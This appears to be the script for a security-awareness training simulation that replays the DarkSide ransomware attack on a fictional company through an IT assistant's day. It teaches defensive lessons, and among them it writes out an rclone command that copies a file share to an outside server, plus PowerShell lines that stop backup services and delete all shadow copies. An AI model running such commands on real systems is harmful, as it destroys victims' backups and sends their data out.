# DarkSide (Colonial Pipeline, May 2021). Human-operated ransomware: the attackers came in with a leaked VPN password.
# A quest (QUESTS.md): the trainee is IT support doing the weekly check of remote-access accounts. The real victims' staff saw
# nothing arrive; the nearest desk-side view is the quiet hole the attackers used, then the slow PC, the failed backup and the note.
os windows
user Dana Okafor
about
  | DarkSide did not arrive in an email. Attackers signed in to the company's remote access with one old password that had leaked, with no second check.
  | They copied the data out first, deleted the backups, then locked the files and threatened to publish what they took. Colonial Pipeline shut down its fuel pipeline while it recovered. The victim here, Northwind Traders, is made up.
story
  | You are Dana Okafor, IT assistant at Northwind Traders, a small food wholesaler. Every week you check the accounts that can sign in to the company's systems from outside, and decide for each: keep or disable.
  | It is Thursday afternoon. You have closed 8 of this week's 10 security jobs. Two to go.
  | Your admin sign-in is in a text file on the desktop. That is a bad habit, but it keeps this training quick.
quota 8 10 Security jobs closed this week

# Dana's desk: the details she copies from (soft flags: careless, but only here to keep the training simple).
file Desktop/admin-login.txt
  at 930 200
  | Northwind Remote Access: admin console
  | User ID: dana.okafor
  | Password: Harbour-Gate-2026!
  | Phone code today (training copy): 482913
file Desktop/service-accounts.txt
  at 930 300
  | Service accounts (old list, do not share)
  | svc-legacy: Scanner-2019-Old
  | svc-backup: Vault-Keeper-77

# The admin console: a sign-in with a password AND a phone code, and the weekly check behind it.
page admin-signin remote-admin.northwind.example/sign-in
  title Northwind Remote Access: admin sign-in
  brand Northwind Remote Access
  favorite
  heading Sign in to the admin console
  | Enter your password, then the code from your phone.
  field User ID = dana.okafor
  field secret Password = Harbour-Gate-2026!
  field Code from your phone = 482913
  button Sign in
page kept-9 remote-admin.northwind.example/accounts/priya.shah/kept
  title Account kept: priya.shah
  brand Northwind Remote Access
  heading Account kept
  | priya.shah stays on the list. Next check: in a week.
page disabled-9 remote-admin.northwind.example/accounts/priya.shah/disabled
  title Account disabled: priya.shah
  brand Northwind Remote Access
  heading Account disabled
  | priya.shah can no longer sign in from outside. Accounts will be asked if that was meant.
page review-9 remote-admin.northwind.example/accounts/priya.shah
  title Weekly check: priya.shah
  brand Northwind Remote Access
  requires admin-signin
  heading Weekly check: priya.shah
  | Account 9 of 10 on this week's list. Check that it is still needed and still protected.
  section This account
  row Name = Priya Shah, Accounts
  row Last sign-in = Wednesday 4 November, 08:55, from 192.0.2.42
  row Second check = Phone prompt on every sign-in
  row Password changed = 12 October 2026
  section Still to check
  columns Account | Last sign-in | Second check
  cells svc-legacy | 2 years ago | none
  note Marcus Lee asked to leave svc-legacy alone until the warehouse scanner vendor replies.
  button Keep: Priya still needs it -> kept-9
  button Disable this account -> disabled-9

mail access-9
  from Access Review <access-review@northwind.example>
  subject Weekly check 9 of 10: priya.shah
  sent 2026-11-05 16:41
  link review-9
  | Hi Dana,
  |
  | The next account on this week's list is priya.shah (Accounts). The link opens it in the admin console.
  |
  | Northwind IT

step Job 9 of 10
  look Mail: the weekly check message
  | A new account has come up on your list. This one is an ordinary one. Do it the normal way first, so you know what normal looks like.
  | One thing to remember from this check: how people sign in, and who is still on the list.
notify mail Access Review
  | Weekly check 9 of 10: priya.shah

step The link goes to our own console
  look the link under the message
  when mail access-9
  | The email links to Northwind's own address, northwind.example. Hover over a link before you click it, to check where it goes.
open access-9

step Password, then a phone code
  look the three boxes: User ID, Password and a code from your phone
  when visit review-9
  move Copy the details from admin-login.txt on the desktop: click a box and press any keys to type, then click “Sign in”.
  | The console asks for a password and then a code from your phone. Two checks, not one. Remember this page: it is what a protected account looks like.
open review-9

step Check the account
  look the details: second check, last sign-in, and the list below
  when choose admin-signin 1
  | You are in. This account signed in yesterday morning from the office, with a phone prompt. It is needed and protected, so keep it.
  | Look at the list below, too: it shows the one account left to check.
signin admin-signin

step 9 of 10 done
  look the counter in the guide: one job left
  when choose review-9 any
  | Done. The last account on the list is svc-legacy. It has not been used for two years, but Marcus asked you to leave it until the scanner vendor replies. So it waits, and you go home.
choose review-9 1
quota +1

# Friday morning. The attackers came in at 02:14 and nobody saw it. The overnight report is the log a defender can read.
program rclone rclone
  publisher none
  signed no
  description File copy tool
  process rclone.exe
  cpu 37
  mem 120
  parent cmd.exe
  command C:\ProgramData\rclone.exe copy \\FS01\Share remote:upload
  net 203.0.113.30:443 (upload)
page signin-log remote-admin.northwind.example/reports/overnight
  title Overnight sign-in report
  brand Northwind Remote Access
  heading Overnight sign-in report: Thursday 22:00 to Friday 06:00
  | Sign-ins from outside the office, overnight.
  section Sign-in at 02:14
  row Account = svc-legacy (last used 2 years ago)
  row Signed in from = 203.0.113.77, not a Northwind address
  row Time = 02:14, when nobody is working
  row Second check = None: password only
  row Password found in a public leak = Yes
  section All sign-ins overnight
  columns Account | From | Second check
  cells marcus.lee | 192.0.2.41 | Phone prompt
  cells svc-legacy | 203.0.113.77 | none
mail overnight-report
  from Access Review <access-review@northwind.example>
  subject Overnight sign-in report (Friday 06:00)
  sent 2026-11-06 06:00
  link signin-log
  | Hi Dana,
  |
  | The overnight report from the remote-access system is ready. The link opens it.
  |
  | Northwind IT
notify mail Access Review
  | Overnight sign-in report (Friday 06:00)

step Friday, 6:50
  look Mail: the overnight sign-in report
  when mail overnight-report
  | You are early. The overnight report has come in, and your PC feels slow. Start with the report.
open overnight-report

step One account, one password
  look the report: svc-legacy at 02:14, from outside, with no second check
  when visit signin-log
  | It is the account you left for Marcus. Someone signed in with its old password, which had leaked, and nothing else was asked. A phone code would have stopped them.
  | One forgotten account without a second check was the whole way in. Someone has been on the network for hours, and your PC has been slow since you sat down.
launch rclone
open signin-log
mail priya-files
  from Priya Shah <priya.shah@northwind.example>
  subject The Share has been crawling
  sent 2026-11-06 06:58
  | Dana,
  |
  | The Share has been very slow since I got in, and my budget file takes ages to open. Is IT doing something to the server?
  |
  | Priya
notify mail Priya Shah
  | The Share has been crawling

step Your PC is slow
  look Mail: Priya's message about the Share
  when mail priya-files
  | Priya says the Share has been crawling since she got in. Your PC is slow too.
  | Something on this PC is busy. Find out what.
open priya-files

step rclone is copying the data out
  look {Task Manager|Activity Monitor}: rclone.exe, using a lot of the processor
  when open taskmanager
  | rclone is an ordinary, free file-copying tool. The attackers use it to send the company's files to their own server: about 100 GB, copied out before the lock.
  | This is why they can threaten to publish: good backups cannot take stolen data back.
open taskmanager
mail backup-alert
  from Backup Monitor <backup-monitor@northwind.example>
  subject Backup job FAILED: FS01, no restore points found
  sent 2026-11-06 07:12
  | The nightly backup did not run on FS01.
  |
  | The Backup Agent service stopped at 04:40, and no restore points were found for the Share.
  |
  | Backup Monitor
notify mail Backup Monitor
  | Backup job FAILED: FS01, no restore points found

# The monitoring alert, and the console the attackers kept hidden.
view darkside-prep console
  title Windows PowerShell
  app Windows PowerShell
  size 470x230
  line PS C:\> Get-Service | Where-Object Name -match "sql|backup|veeam" | Stop-Service -Force
  line Stopping service: SQL Server (MSSQLSERVER) ... done
  line Stopping service: Backup Agent ... done
  line PS C:\> Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }
  line Deleted shadow copy 1 of 4 ... 4 of 4
  line PS C:\> # restore points and backups are gone
  line (Illustration for training: nothing was run.)
  button Show what ran next -> done primary

step The backups are gone
  look Mail: the backup alert, and the PowerShell window that opens
  when mail backup-alert
  | Before locking anything, the attackers stopped the backup and database services and deleted every restore point.
  | The real PowerShell window was hidden; this one is an illustration.
  | Without backups, a company has little choice. This is why they do it first.
open backup-alert
show darkside-prep

# The encryptor: a random file name, pushed to many computers at once by the attackers. No prompt, no window.
program darkside-enc a8f3c1d2
  publisher none
  signed no
  description Unknown program
  process a8f3c1d2.exe
  cpu 100
  mem 210
  parent services.exe
  command C:\Windows\Temp\a8f3c1d2.exe -path C:\Users\dana

# IT's report form: the safe copy of the leak site, and the one button that reports this PC. No criminal page has a report button.
page incident-sent it-help.northwind.example/incident/sent
  title Incident reported
  brand Northwind IT
  heading Reported to IT
  | Reported at 07:41. IT is cutting this PC and the Share off the network and calling the response team and the police.
  | Do not pay, do not wipe or restart the PC, and do not open the link in the note.
page it-report it-help.northwind.example/report
  title Report a ransom note
  brand Northwind IT
  heading Report to IT
  | If this PC shows a ransom note, report it now. Do not pay, and do not open the link in the note.
  section Safe copy of the attackers' leak page (training copy)
  row Company = Northwind Traders
  row Data copied = 100 GB
  row Content = company documents, staff records
  timer Files will be published in = 172800
  note Training copy: no payment or publishing happens.
  button Report this PC to IT -> incident-sent

step Every file ends in .7e8f2a1c
  look Documents: every file ends in .7e8f2a1c, with a padlock. {Task Manager|Activity Monitor}: a8f3c1d2.exe at 100% CPU
  when done darkside-prep
  | The encryptor runs on many computers at once. Every file gets a new ending, the same eight characters for this victim. Opening one only says it cannot be opened.
  | A note called README is in every folder it locked. It says the data is stolen and will be published if the company does not pay.
launch darkside-enc
encrypt Documents .7e8f2a1c
encrypt Pictures .7e8f2a1c
encrypt Desktop .7e8f2a1c
file Desktop/README.7e8f2a1c.TXT
  at 930 400
  | Welcome to DarkSide.
  |
  | Your computers and servers are encrypted, backups are deleted, and we downloaded your private data.
  | If you do not pay, the data will be published on our leak site.
  | To get the decryptor, open the private page on the link below (a made-up address) with your personal key.
  |
  | http://darkside-payments.invalid  Key: 7e8f2a1c (training copy)
  |
  | (Fictional training copy. Nothing on this desktop is real.)
file Documents/README.7e8f2a1c.TXT
  | Welcome to DarkSide. Your computers and servers are encrypted, and we downloaded your private data.
  | (Fictional training copy. Nothing on this desktop is real.)
file Pictures/README.7e8f2a1c.TXT
  | Welcome to DarkSide. Your computers and servers are encrypted, and we downloaded your private data.
  | (Fictional training copy. Nothing on this desktop is real.)
open Documents
mail it-leak
  from Northwind IT <servicedesk@northwind.example>
  subject Do not pay or open the link in the note
  sent 2026-11-06 07:35
  link it-report
  | All,
  |
  | Several PCs show a ransom note. Do not pay, and do not use the link in the note itself.
  |
  | Our monitoring service has a safe copy of the attackers' page on the report form that the link opens. If you see the note, report it to IT now.
  |
  | Northwind IT
notify mail Northwind IT
  | Do not pay or open the link in the note

step The threat to publish
  look the safe copy on IT's report form: a company card and a countdown
  when visit it-report
  | If a company does not pay, the attackers publish its name and files on a leak page. This is why restoring from backup is not enough.
  | The copy on IT's form shows what they threaten. Do not look for the real page.
open it-report

step Report it, do not pay
  look the counter in the guide: the 10th job is the report
  when choose it-report any
  | Reporting it to IT at once is the right move. Do not pay, do not restart the PC and do not look for the attackers.
  | That is job 10 of 10. IT takes it from here, but the files and backups are still gone.
choose it-report 1
quota +1

step What DarkSide took
  look the animation: everything the attackers took and locked
  | The attackers had been inside for about a week before the lock. This desk squeezes it into one night.
  | Colonial Pipeline shut down its fuel pipeline for nearly a week and paid about 75 bitcoin the same week; the FBI later recovered part of it.
  | The old password never needed to be guessed: it was already public. A second check on that one account would have stopped the whole attack.
open Desktop/README.7e8f2a1c.TXT
attack ransomware-encrypt
  | Q3-report.docx
  | budget.xlsx
  | notes.txt
  | todo.txt
  | backups deleted
  | 100 GB copied out first

flag hard section signin-log 1
  label The 02:14 sign-in: leaked password, no second check
  | A sign-in at 02:14 from outside, with a leaked password and no second check. The report is the only warning there is.
flag hard process rclone.exe
  label rclone.exe, a copy tool sending data out
  | An ordinary file-copying tool, sending the company's data to the attackers' server.
flag hard process a8f3c1d2.exe
  label a8f3c1d2.exe, the encryptor
  | A program with a random eight-character name, no publisher, and all the processor.
flag hard mail backup-alert
  label The backup alert: services stopped, no restore points
  | A backup that fails with no restore points means someone stopped the backup service and deleted the copies on purpose.
flag hard file Documents/Q3-report.docx.7e8f2a1c
  label A locked file: new ending and a padlock
  | The new ending and the padlock mean the file is locked. It cannot be opened.
flag hard file Documents/README.7e8f2a1c.TXT
  label README.7e8f2a1c.TXT, the ransom note
  | The ransom note: the data is stolen, and it will be published if the company does not pay.
flag hard section it-report 1
  label The threat to publish, on IT's report form
  | The threat to publish. Restoring from backup does not take the stolen data back.
flag soft file Desktop/admin-login.txt.7e8f2a1c
  label admin-login.txt: the admin password
  | An admin password in a text file on the desktop. A one-time code in a file is no second check at all.
flag soft file Desktop/service-accounts.txt.7e8f2a1c
  label service-accounts.txt: old service passwords
  | Old service passwords in a text file: any program that runs can read them. svc-legacy is the very account the attackers used.

lesson
  | Remove accounts that are no longer used, and protect every remote-access account with a second check such as a phone prompt.
  | Keep offline backups the attackers cannot reach, and report an unexpected sign-in or a failed backup at once: it can be the first and last warning.
  | Do not pay, and do not restart or wipe the PC: call IT and the police first.
